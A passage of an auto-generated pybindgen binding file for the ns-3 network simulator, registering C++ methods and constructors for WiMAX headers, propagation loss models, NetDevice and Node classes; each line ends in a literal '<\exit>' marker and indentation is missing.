[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetConfirmationCode',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetConfirmationCode',<\exit>
'void',<\exit>
[param('uint16_t', 'confirmationCode')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3DsaReq_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaReq const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'sfid')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3DsaRsp_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::DsaRsp const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetConfirmationCode',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetServiceFlow',<\exit>
'ns3::ServiceFlow',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSfid',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTransactionId',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetConfirmationCode',<\exit>
'void',<\exit>
[param('uint16_t', 'confirmationCode')])<\exit>
cls.add_method('SetServiceFlow',<\exit>
'void',<\exit>
[param('ns3::ServiceFlow', 'sf')])<\exit>
cls.add_method('SetSfid',<\exit>
'void',<\exit>
[param('uint32_t', 'sfid')])<\exit>
cls.add_method('SetTransactionId',<\exit>
'void',<\exit>
[param('uint16_t', 'transactionId')])<\exit>
return<\exit>
def register_Ns3EmptyAttributeValue_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EmptyAttributeValue const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
visibility='private', is_virtual=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3EventImpl_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::EventImpl const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Cancel',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('Invoke',<\exit>
'void',<\exit>
[])<\exit>
cls.add_method('IsCancelled',<\exit>
'bool',<\exit>
[])<\exit>
cls.add_method('Notify',<\exit>
'void',<\exit>
[],<\exit>
is_pure_virtual=True, visibility='protected', is_virtual=True)<\exit>
return<\exit>
def register_Ns3FixedRssLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetRss',<\exit>
'void',<\exit>
[param('double', 'rss')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3FragmentationSubheader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::FragmentationSubheader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetFc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetFsn',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetFc',<\exit>
'void',<\exit>
[param('uint8_t', 'fc')])<\exit>
cls.add_method('SetFsn',<\exit>
'void',<\exit>
[param('uint8_t', 'fsn')])<\exit>
return<\exit>
def register_Ns3FriisPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'frequency'), param('double', 'speed')])<\exit>
cls.add_method('SetLambda',<\exit>
'void',<\exit>
[param('double', 'lambda')])<\exit>
cls.add_method('SetSystemLoss',<\exit>
'void',<\exit>
[param('double', 'systemLoss')])<\exit>
cls.add_method('SetMinDistance',<\exit>
'void',<\exit>
[param('double', 'minDistance')])<\exit>
cls.add_method('GetMinDistance',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetLambda',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSystemLoss',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3GenericMacHeader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GenericMacHeader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetCi',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetCid',<\exit>
'ns3::Cid',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEc',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetEks',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHcs',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetHt',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetLen',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetType',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetCi',<\exit>
'void',<\exit>
[param('uint8_t', 'ci')])<\exit>
cls.add_method('SetCid',<\exit>
'void',<\exit>
[param('ns3::Cid', 'cid')])<\exit>
cls.add_method('SetEc',<\exit>
'void',<\exit>
[param('uint8_t', 'ec')])<\exit>
cls.add_method('SetEks',<\exit>
'void',<\exit>
[param('uint8_t', 'eks')])<\exit>
cls.add_method('SetHcs',<\exit>
'void',<\exit>
[param('uint8_t', 'hcs')])<\exit>
cls.add_method('SetHt',<\exit>
'void',<\exit>
[param('uint8_t', 'HT')])<\exit>
cls.add_method('SetLen',<\exit>
'void',<\exit>
[param('uint16_t', 'len')])<\exit>
cls.add_method('SetType',<\exit>
'void',<\exit>
[param('uint8_t', 'type')])<\exit>
cls.add_method('check_hcs',<\exit>
'bool',<\exit>
[],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3GrantManagementSubheader_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::GrantManagementSubheader const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_virtual=True)<\exit>
cls.add_method('GetInstanceTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetName',<\exit>
'std::string',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPbr',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetPm',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('GetSi',<\exit>
'uint8_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('Print',<\exit>
'void',<\exit>
[param('std::ostream &', 'os')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Serialize',<\exit>
'void',<\exit>
[param('ns3::Buffer::Iterator', 'start')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('SetPbr',<\exit>
'void',<\exit>
[param('uint16_t', 'pbr')])<\exit>
cls.add_method('SetPm',<\exit>
'void',<\exit>
[param('uint8_t', 'pm')])<\exit>
cls.add_method('SetSi',<\exit>
'void',<\exit>
[param('uint8_t', 'si')])<\exit>
return<\exit>
def register_Ns3IpcsClassifier_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::IpcsClassifier const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_method('Classify',<\exit>
'ns3::ServiceFlow *',<\exit>
[param('ns3::Ptr< ns3::Packet const >', 'packet'), param('ns3::Ptr< ns3::ServiceFlowManager >', 'sfm'), param('ns3::ServiceFlow::Direction', 'dir')])<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
return<\exit>
def register_Ns3Ipv4AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv4AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv4Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv4Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv4Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv4MaskChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4MaskChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv4MaskValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv4MaskValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv4Mask const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv4Mask',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv4Mask const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv6AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv6AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv6Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv6Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv6Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3Ipv6PrefixChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6PrefixChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Ipv6PrefixValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Ipv6PrefixValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Ipv6Prefix const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Ipv6Prefix',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Ipv6Prefix const &', 'value')])<\exit>
return<\exit>
def register_Ns3LogDistancePropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetPathLossExponent',<\exit>
'void',<\exit>
[param('double', 'n')])<\exit>
cls.add_method('GetPathLossExponent',<\exit>
'double',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SetReference',<\exit>
'void',<\exit>
[param('double', 'referenceDistance'), param('double', 'referenceLoss')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3Mac48AddressChecker_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48AddressChecker const &', 'arg0')])<\exit>
return<\exit>
def register_Ns3Mac48AddressValue_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::Mac48AddressValue const &', 'arg0')])<\exit>
cls.add_constructor([param('ns3::Mac48Address const &', 'value')])<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::AttributeValue >',<\exit>
[],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('DeserializeFromString',<\exit>
'bool',<\exit>
[param('std::string', 'value'), param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_virtual=True)<\exit>
cls.add_method('Get',<\exit>
'ns3::Mac48Address',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('SerializeToString',<\exit>
'std::string',<\exit>
[param('ns3::Ptr< ns3::AttributeChecker const >', 'checker')],<\exit>
is_const=True, is_virtual=True)<\exit>
cls.add_method('Set',<\exit>
'void',<\exit>
[param('ns3::Mac48Address const &', 'value')])<\exit>
return<\exit>
def register_Ns3MatrixPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('SetLoss',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b'), param('double', 'loss'), param('bool', 'symmetric', default_value='true')])<\exit>
cls.add_method('SetDefaultLoss',<\exit>
'void',<\exit>
[param('double', 'arg0')])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3NakagamiPropagationLossModel_methods(root_module, cls):<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_constructor([])<\exit>
cls.add_method('DoCalcRxPower',<\exit>
'double',<\exit>
[param('double', 'txPowerDbm'), param('ns3::Ptr< ns3::MobilityModel >', 'a'), param('ns3::Ptr< ns3::MobilityModel >', 'b')],<\exit>
is_const=True, visibility='private', is_virtual=True)<\exit>
return<\exit>
def register_Ns3NetDevice_methods(root_module, cls):<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::NetDevice const &', 'arg0')])<\exit>
cls.add_method('AddLinkChangeCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< void, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'callback')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('GetAddress',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetBroadcast',<\exit>
'ns3::Address',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetChannel',<\exit>
'ns3::Ptr< ns3::Channel >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetIfIndex',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMtu',<\exit>
'uint16_t',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv4Address', 'multicastGroup')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetMulticast',<\exit>
'ns3::Address',<\exit>
[param('ns3::Ipv6Address', 'addr')],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetNode',<\exit>
'ns3::Ptr< ns3::Node >',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('GetTypeId',<\exit>
'ns3::TypeId',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('IsBridge',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsBroadcast',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsLinkUp',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsMulticast',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('IsPointToPoint',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('NeedsArp',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
cls.add_method('Send',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SendFrom',<\exit>
'bool',<\exit>
[param('ns3::Ptr< ns3::Packet >', 'packet'), param('ns3::Address const &', 'source'), param('ns3::Address const &', 'dest'), param('uint16_t', 'protocolNumber')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetAddress',<\exit>
'void',<\exit>
[param('ns3::Address', 'address')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetIfIndex',<\exit>
'void',<\exit>
[param('uint32_t const', 'index')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetMtu',<\exit>
'bool',<\exit>
[param('uint16_t const', 'mtu')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetNode',<\exit>
'void',<\exit>
[param('ns3::Ptr< ns3::Node >', 'node')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetPromiscReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::Address const &, ns3::NetDevice::PacketType, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SetReceiveCallback',<\exit>
'void',<\exit>
[param('ns3::Callback< bool, ns3::Ptr< ns3::NetDevice >, ns3::Ptr< ns3::Packet const >, unsigned short, ns3::Address const &, ns3::empty, ns3::empty, ns3::empty, ns3::empty, ns3::empty >', 'cb')],<\exit>
is_pure_virtual=True, is_virtual=True)<\exit>
cls.add_method('SupportsSendFrom',<\exit>
'bool',<\exit>
[],<\exit>
is_pure_virtual=True, is_const=True, is_virtual=True)<\exit>
return<\exit>
def register_Ns3NixVector_methods(root_module, cls):<\exit>
cls.add_output_stream_operator()<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('ns3::NixVector const &', 'o')])<\exit>
cls.add_method('AddNeighborIndex',<\exit>
'void',<\exit>
[param('uint32_t', 'newBits'), param('uint32_t', 'numberOfBits')])<\exit>
cls.add_method('BitCount',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 'numberOfNeighbors')],<\exit>
is_const=True)<\exit>
cls.add_method('Copy',<\exit>
'ns3::Ptr< ns3::NixVector >',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Deserialize',<\exit>
'uint32_t',<\exit>
[param('uint32_t const *', 'buffer'), param('uint32_t', 'size')])<\exit>
cls.add_method('ExtractNeighborIndex',<\exit>
'uint32_t',<\exit>
[param('uint32_t', 'numberOfBits')])<\exit>
cls.add_method('GetRemainingBits',<\exit>
'uint32_t',<\exit>
[])<\exit>
cls.add_method('GetSerializedSize',<\exit>
'uint32_t',<\exit>
[],<\exit>
is_const=True)<\exit>
cls.add_method('Serialize',<\exit>
'uint32_t',<\exit>
[param('uint32_t *', 'buffer'), param('uint32_t', 'maxSize')],<\exit>
is_const=True)<\exit>
return<\exit>
def register_Ns3Node_methods(root_module, cls):<\exit>
cls.add_constructor([param('ns3::Node const &', 'arg0')])<\exit>
cls.add_constructor([])<\exit>
cls.add_constructor([param('uint32_t', 'systemId')])<\exit>
cls.add_method('AddApplication',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::Application >', 'application')])<\exit>
cls.add_method('AddDevice',<\exit>
'uint32_t',<\exit>
[param('ns3::Ptr< ns3::NetDevice >', 'device')])<\exit>
cls.add_method('ChecksumEnabled',<\exit>
'bool',<\exit>
[],<\exit>
is_static=True)<\exit>
cls.add_method('GetApplication',<\exit>
'ns3::Ptr< ns3::Application >',<\exit>
[param('uint32_t', 'index')],<\exit>
is_const=True)<\exit>
cls.add_method('GetDevice',<\exit>
'ns3::Ptr< ns3::NetDevice >',<\exit>
